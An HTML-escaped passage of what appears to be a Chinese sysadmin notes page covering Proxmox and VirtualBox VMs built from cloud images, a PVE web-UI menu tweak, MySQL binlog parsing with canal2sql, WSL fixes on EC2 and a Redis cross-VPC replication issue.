 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://www.truenasscale.com/2022/05/24/1117.html" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://www.truenasscale.com/2022/05/24/1117.html&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;br&gt;
&lt;a href="https://fairysen.com/742.html#toc-head-6" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://fairysen.com/742.html#toc-head-6&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;创建&lt;code&gt;虚拟机&lt;/code&gt;, &lt;code&gt;操作系统&lt;/code&gt;设置，选择 &lt;code&gt;不使用任何介质&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;系统&lt;/code&gt; 设置将 &lt;code&gt;SCSI控制器&lt;/code&gt; 调整为 &lt;code&gt;VirtIO SCSI&lt;/code&gt;, 机器可以设置为&lt;code&gt;q35&lt;/code&gt;也可以默认&lt;/li&gt;
&lt;li&gt;&lt;code&gt;磁盘&lt;/code&gt; 设置删除掉所有的默认即可, 最后完成创建&lt;/li&gt;
&lt;li&gt;完成创建后, 登陆到 &lt;code&gt;PVE&lt;/code&gt; 主机上面，使用命令&lt;code&gt;qm importdisk 100 aliyun_3_x64_20G_nocloud_alibase_20240528.qcow2 local-lvm&lt;/code&gt; 将 &lt;code&gt;qcow2&lt;/code&gt; 导入到虚拟机中，&lt;code&gt;100&lt;/code&gt;为虚拟机的&lt;code&gt;VM ID&lt;/code&gt;, &lt;code&gt;local-lvm&lt;/code&gt;是要存储的位置， 没有 &lt;code&gt;qm&lt;/code&gt; 命令，安装下 &lt;code&gt;cloud-init&lt;/code&gt; 软件包&lt;/li&gt;
&lt;li&gt;导入完成后， 在&lt;code&gt;硬件&lt;/code&gt;里面可以看到一个 &lt;code&gt;未使用的磁盘0&lt;/code&gt;, 然后&lt;code&gt;双击&lt;/code&gt;编辑, 一般默认即可(&lt;code&gt;总线/设备&lt;/code&gt;调整为&lt;code&gt;SCSI&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;选项&lt;/code&gt; 中，选择 &lt;code&gt;引导顺序&lt;/code&gt;，将添加的那块磁盘设为第一启动项&lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;Cloud-init&lt;/code&gt; 中，设置下 &lt;code&gt;用户名 / 密码&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;启动虚拟机&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 class="heading-element" id="virtualbox-中使用-cloud-系统镜像快速创建虚拟机"&gt;&lt;span&gt;Virtualbox 中使用 Cloud 系统镜像快速创建虚拟机&lt;/span&gt;
 &lt;a href="#virtualbox-%e4%b8%ad%e4%bd%bf%e7%94%a8-cloud-%e7%b3%bb%e7%bb%9f%e9%95%9c%e5%83%8f%e5%bf%ab%e9%80%9f%e5%88%9b%e5%bb%ba%e8%99%9a%e6%8b%9f%e6%9c%ba" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;  以&lt;a href="https://mirrors.aliyun.com/alinux/3/image/" target="_blank" rel="external nofollow noopener noreferrer"&gt;&lt;code&gt;Alibaba Cloud Linux 3&lt;/code&gt;&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;云镜像为例，下载&lt;a href="https://alinux3.oss-cn-hangzhou.aliyuncs.com/aliyun_3_x64_20G_nocloud_alibase_20240528.vhd" target="_blank" rel="external nofollow noopener noreferrer"&gt;&lt;code&gt;aliyun_3_x64_20G_nocloud_alibase_20240528.vhd&lt;/code&gt;&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt; 和 &lt;a href="https://alinux3.oss-cn-hangzhou.aliyuncs.com/seed.img" target="_blank" rel="external nofollow noopener noreferrer"&gt;&lt;code&gt;seed.img&lt;/code&gt;&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;, &lt;code&gt;seed.img&lt;/code&gt;是 &lt;code&gt;cloud-init&lt;/code&gt; 数据源，可以自己创建参考&lt;a href="https://cloudinit.readthedocs.io/en/latest/reference/examples.html" target="_blank" rel="external nofollow noopener noreferrer"&gt;&lt;code&gt;官方文档&lt;/code&gt;&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;或者&lt;a href="https://help.aliyun.com/zh/alinux/getting-started/use-alibaba-cloud-linux-3-images-in-an-on-premises-environment?spm=a2c4g.11186623.0.0.36534cfcWFRMKk#section-eyk-z6n-5ot" target="_blank" rel="external nofollow noopener noreferrer"&gt;&lt;code&gt;阿里云文档&lt;/code&gt;&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;的生成示例。&lt;/p&gt;
&lt;h3 class="heading-element" id="虚拟机创建和配置"&gt;&lt;span&gt;虚拟机创建和配置&lt;/span&gt;
 &lt;a href="#%e8%99%9a%e6%8b%9f%e6%9c%ba%e5%88%9b%e5%bb%ba%e5%92%8c%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;新建虚拟机， &lt;code&gt;虚拟机光盘&lt;/code&gt;无需指定，&lt;code&gt;类型&lt;/code&gt;和&lt;code&gt;版本&lt;/code&gt;按照自己使用的云镜像指定，然后一直下一步, &lt;code&gt;虚拟硬盘&lt;/code&gt;选择&lt;code&gt;不添加虚拟硬盘&lt;/code&gt;， 然后点击下一步， 直到完成创建。&lt;/li&gt;
&lt;li&gt;完成创建后, &lt;code&gt;右键&lt;/code&gt;创建好的虚拟机，选择&lt;code&gt;设置&lt;/code&gt;， 理论上所有设置都可以使用默认值， 只需要更改一个地方。
&lt;ol&gt;
&lt;li&gt;选择 &lt;code&gt;存储&lt;/code&gt;，选择&lt;code&gt;控制器: IDE&lt;/code&gt;，右键添加&lt;code&gt;cloud-init&lt;/code&gt;源, 就是下载的那个&lt;code&gt;seed.img&lt;/code&gt;或者自己创建的(&lt;em&gt;需要先注册到&lt;code&gt;Virtualbox&lt;/code&gt;，这个步骤在测试时候发现不做似乎没什么影响，只是进去后使用的是下载镜像默认的帐号名密码，&lt;code&gt;Alibaba Cloud Linux 3&lt;/code&gt;的是&lt;code&gt;alinux:aliyun&lt;/code&gt;,这个在阿里云文档中手动生成配置文件中可以看到&lt;/em&gt;)。&lt;/li&gt;
&lt;li&gt;选择 &lt;code&gt;存储&lt;/code&gt; , 选择 &lt;code&gt;控制器: SATA&lt;/code&gt;, 在右侧设置中将&lt;code&gt;型号&lt;/code&gt;改为&lt;code&gt;virtio-scsi&lt;/code&gt;(&lt;em&gt;&lt;strong&gt;这个步骤是必须的&lt;/strong&gt;&lt;/em&gt;), 然后&lt;code&gt;右键&lt;/code&gt;添加硬盘, 选择下载的&lt;code&gt;aliyun_3_x64_20G_nocloud_alibase_20240528.vhd&lt;/code&gt;(&lt;em&gt;同样需要先注册到&lt;code&gt;Virtualbox&lt;/code&gt;&lt;/em&gt;)。&lt;/li&gt;
&lt;li&gt;选择 &lt;code&gt;网络&lt;/code&gt;，&lt;code&gt;连接方式&lt;/code&gt;根据自己情况调整，&lt;code&gt;高级&lt;/code&gt;中&lt;code&gt;控制芯片&lt;/code&gt;修改为 &lt;code&gt;准虚拟化网络(virtio-net)&lt;/code&gt;, 然后确定修改。&lt;/li&gt;
&lt;li&gt;最后正常启动虚拟机即可(注意： 第一次启动可能会比较慢，多等待一些时间就可以了， 启动后注意先配置好网络).&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="pve-添加额外菜单-监控组件"&gt;&lt;span&gt;PVE 添加额外菜单-监控组件&lt;/span&gt;
 &lt;a href="#pve-%e6%b7%bb%e5%8a%a0%e9%a2%9d%e5%a4%96%e8%8f%9c%e5%8d%95-%e7%9b%91%e6%8e%a7%e7%bb%84%e4%bb%b6" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;// 当前测试版本为 8.2.2
// 修改Web界面源代码 /usr/share/pve-manager/js/pvemanagerlib.js(注意备份)
// 搜索到内容 `if (caps.nodes[&amp;#39;Sys.Audit&amp;#39;]) {`，大概在 43869 行, 注意搜索结果会有多个。
// 可以将前端界面修改为英文，然后随便改一个 gettext 内的内容刷新，看是否找对位置。
// 添加菜单，完整内容如下 
if (caps.nodes[&amp;#39;Sys.Audit&amp;#39;]) {
 me.items.push(
 {
 xtype: &amp;#39;pveNodeSummary&amp;#39;,
 title: gettext(&amp;#39;Summary&amp;#39;),
 iconCls: &amp;#39;fa fa-book&amp;#39;,
 itemId: &amp;#39;summary&amp;#39;,
 },
 {
 xtype: &amp;#39;pmxNotesView&amp;#39;,
 title: gettext(&amp;#39;Notes&amp;#39;),
 iconCls: &amp;#39;fa fa-sticky-note-o&amp;#39;,
 itemId: &amp;#39;notes&amp;#39;,
 },
 /// 添加内容开始
 {
 xtype: &amp;#39;prometheusMonitorView&amp;#39;,
 title: &amp;#39;Prometheus 监控&amp;#39;,
 iconCls: &amp;#39;fa fa-line-chart&amp;#39;,
 itemId: &amp;#39;note-prometheus&amp;#39;,
 }
 /// 添加内容结束
 );
}

/// 在文件最末尾添加 
Ext.define(&amp;#39;PVE.node.PrometheusMonitor&amp;#39;, {
 extend: &amp;#39;Ext.panel.Panel&amp;#39;,
 alias: &amp;#39;widget.prometheusMonitorView&amp;#39;,

 scrollable: true,
 bodyPadding: 5,

 initComponent: function() {
 var me = this;

 var prometheusIframe = {
 xtype: &amp;#39;component&amp;#39;,
 autoEl: {
 tag: &amp;#39;iframe&amp;#39;,
 style: &amp;#39;height: 100%; width: 100%; border: none;&amp;#39;,
 src: &amp;#39;https://sogou.com&amp;#39;,
				frameborder: 0,
				scrolling: &amp;#39;auto&amp;#39;
 }
 };

 Ext.apply(me, {
 layout: &amp;#39;fit&amp;#39;,
 items: [prometheusIframe]
 });

 me.callParent();
 }
});&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="binlog-解析工具"&gt;&lt;span&gt;binlog 解析工具&lt;/span&gt;
 &lt;a href="#binlog-%e8%a7%a3%e6%9e%90%e5%b7%a5%e5%85%b7" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://github.com/zhuchao941/canal2sql" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://github.com/zhuchao941/canal2sql&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;# 常用参数
## -sql_type: 只解析指定类型，支持 insert,update,delete,ddl。多个类型用逗号隔开，如--sql-type=insert,delete。可选。默认为insert,update,delete,ddl 
## -filter: 白名单,指定导出，多个逗号隔开 &amp;lt;库名&amp;gt;.&amp;lt;表名&amp;gt;(db.*、*.*)
## -mode: online/file/aliyun，默认online
## --file_url: 离线的binlog文件，支持http url访问
## -B: 显示回滚sql
## ...


# 1. 在线模式, 解析账户权限需要 SELECT, REPLICATION SLAVE, REPLICATION CLIENT 
$&amp;gt; java -jar canal2sql-1.1.3.jar -sql_type update,delete -filter &amp;lt;database&amp;gt;.&amp;lt;tables&amp;gt; -mode file -file_url &amp;#39;file:/tmp/mysql-bin.000016&amp;#39; -uroot -P3306 -pxxxxx -hlocalhost


# 2. 离线模式
## 导出数据库标结构
$&amp;gt; mysqldump -uroot -pxxxxx -hlocalhost --set-gtid-purged=OFF --default-character-set=utf8mb4 --single-transaction -R -E -B -d &amp;lt;database&amp;gt; &amp;gt; /tmp/database.sql
## 
$&amp;gt; java -jar ./canal2sql-1.1.3.jar -mode file -ddl &amp;#39;/tmp/database.sql&amp;#39; -file_url &amp;#39;http://localhost:8080/binlog/mysql-bin.000474&amp;#39; &lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="亚马逊云-ec2-windows-2022-安装-wsl-问题"&gt;&lt;span&gt;亚马逊云 EC2 Windows (2022) 安装 WSL 问题&lt;/span&gt;
 &lt;a href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e4%ba%91-ec2-windows-2022-%e5%ae%89%e8%a3%85-wsl-%e9%97%ae%e9%a2%98" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;注意: 虚拟化的&lt;code&gt;EC2 Windows&lt;/code&gt;实例只支持&lt;code&gt;WSL 1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/install-wsl-on-ec2-windows-instance.html" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/install-wsl-on-ec2-windows-instance.html&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 class="heading-element" id="远程登陆-windows-openssh-服务后-无法执行-wsl-命令启动子系统-the-file-cannot-be-accessed-by-the-system"&gt;&lt;span&gt;远程登陆 windows openssh 服务后， 无法执行 wsl 命令启动子系统 The file cannot be accessed by the system&lt;/span&gt;
 &lt;a href="#%e8%bf%9c%e7%a8%8b%e7%99%bb%e9%99%86-windows-openssh-%e6%9c%8d%e5%8a%a1%e5%90%8e-%e6%97%a0%e6%b3%95%e6%89%a7%e8%a1%8c-wsl-%e5%91%bd%e4%bb%a4%e5%90%af%e5%8a%a8%e5%ad%90%e7%b3%bb%e7%bb%9f-the-file-cannot-be-accessed-by-the-system" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;使用绝对路径打开 &lt;code&gt;&amp;quot;C:\Program Files\WSL\wsl.exe&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="wsl-子系统挂载权限问题"&gt;&lt;span&gt;WSL 子系统挂载权限问题&lt;/span&gt;
 &lt;a href="#wsl-%e5%ad%90%e7%b3%bb%e7%bb%9f%e6%8c%82%e8%bd%bd%e6%9d%83%e9%99%90%e9%97%ae%e9%a2%98" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;windows&lt;/code&gt;盘符默认挂载到&lt;code&gt;/mnt&lt;/code&gt;目录下，且权限为&lt;code&gt;777&lt;/code&gt;, 这不仅不方便，也有一些安全问题
&lt;ul&gt;
&lt;li&gt;解决: 创建或者修改文件&lt;code&gt;/etc/wsl.conf&lt;/code&gt;文件,添加以下内容
&lt;pre&gt;&lt;code&gt;[automount]
enabled = true
root = /mnt/
options = &amp;#34;metadata,dmask=022,fmask=133&amp;#34;
mountFsTab = false&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果这样创建文件仍然是&lt;code&gt;777&lt;/code&gt;, 可以在&lt;code&gt;/etc/profile&lt;/code&gt;中添加一些&lt;code&gt;umask&lt;/code&gt;设定
&lt;pre&gt;&lt;code&gt;if [[ &amp;#34;$(umask)&amp;#34; == &amp;#39;000&amp;#39; ]]; then
 umask 022
fi&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;重启 &lt;code&gt;wsl --shutdown&lt;/code&gt; , 然后重启登陆， 不行就重启下系统&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="wazhu-agent-激活变量参考"&gt;&lt;span&gt;Wazhu agent 激活变量参考&lt;/span&gt;
 &lt;a href="#wazhu-agent-%e6%bf%80%e6%b4%bb%e5%8f%98%e9%87%8f%e5%8f%82%e8%80%83" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://documentation.wazuh.com/current/user-manual/agent/agent-enrollment/deployment-variables/deployment-variables-linux.html" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://documentation.wazuh.com/current/user-manual/agent/agent-enrollment/deployment-variables/deployment-variables-linux.html&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 class="heading-element" id="跨-vpc-访问-redis-主备info-replication-拿到的从库ip是-内网ip"&gt;&lt;span&gt;跨 VPC 访问 Redis 主备，info replication 拿到的从库ip是 内网ip&lt;/span&gt;
 &lt;a href="#%e8%b7%a8-vpc-%e8%ae%bf%e9%97%ae-redis-%e4%b8%bb%e5%a4%87info-replication-%e6%8b%bf%e5%88%b0%e7%9a%84%e4%bb%8e%e5%ba%93ip%e6%98%af-%e5%86%85%e7%bd%91ip" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;这个问题初次发现是应用调用华为的云Redis发现的，云Redis是跨vpc部署的主备， 但是info replication 拿到的从库ip是内网ip，由于应用和redis实际环境不处于同一网络，导致应用访问超时，目前的解决是研发这边准备重写对应组件，但发现该组件作者已经解决了这个问题，升级到新版本后解决。 架构可以看成是 &lt;code&gt;用户: 192.168.2.8/24&lt;/code&gt; 访问 &lt;code&gt;代理:192.168.2.10/24&lt;/code&gt; &amp;mdash;&amp;gt; &lt;code&gt;Redis主: 10.0.2.10/24&lt;/code&gt;, 而 用户通过 &lt;code&gt;info replication&lt;/code&gt; 拿到的却是 &lt;code&gt;10.0.2.10/24&lt;/code&gt;，所以 &lt;code&gt;192.168.2.8/24&lt;/code&gt; 肯定无法连接 &lt;code&gt;10.0.2.10/24&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这个问题感觉还是比较经典的，比如 用容器部署的主备，应用和主备环境不处于同一主机， 也会出现类似问题。应该是容器化部署类的都会产生，架构方面应该可以解决，但是没有找到合适的解决方案。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="docker-pull-超时问题"&gt;&lt;span&gt;docker pull 超时问题&lt;/span&gt;
 &lt;a href="#docker-pull-%e8%b6%85%e6%97%b6%e9%97%ae%e9%a2%98" class="heading-mark"&gt;
